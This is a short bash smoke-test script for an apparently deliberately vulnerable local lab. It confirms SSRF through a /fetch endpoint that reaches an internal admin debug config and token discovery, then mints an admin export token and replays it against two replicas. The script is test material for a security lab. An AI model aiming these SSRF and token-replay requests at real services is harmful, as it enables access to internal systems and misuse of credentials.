#!/usr/bin/env bash
set -euo pipefail
BASE=http://localhost:18080

echo "[*] Health check"
curl -s $BASE/health | jq .

echo
echo "[*] Confirm vulnerable SSRF can read internal debug config"
curl -s "$BASE/fetch?url=http://gateway@internal-admin-a:5001/debug/config" | jq .

echo
echo "[*] Confirm redirect-based SSRF reaches token-service discovery (over-exposed baseline)"
curl -s "$BASE/fetch?url=http://redirector:5002/to-token-discovery" | jq .

echo
echo "[*] Mint raw export token through vulnerable helper"
NONCE="smoke-pre-$(date +%s)"
RAW=$(curl -s -H 'X-Admin-Api-Key: lab-admin-key' -H "X-Nonce: $NONCE" "$BASE/ops/raw-token?scope=admin.export.read")
echo "$RAW" | jq .
TOKEN=$(echo "$RAW" | jq -r '.access_token')

echo
echo "[*] Use same token against replica A"
curl -s -H 'X-Admin-Api-Key: lab-admin-key' --get --data-urlencode "target=a" --data-urlencode "token=$TOKEN" "$BASE/ops/use-token" | jq .

echo
echo "[*] Replay same token against replica B (should also succeed in vulnerable baseline)"
curl -s -H 'X-Admin-Api-Key: lab-admin-key' --get --data-urlencode "target=b" --data-urlencode "token=$TOKEN" "$BASE/ops/use-token" | jq .
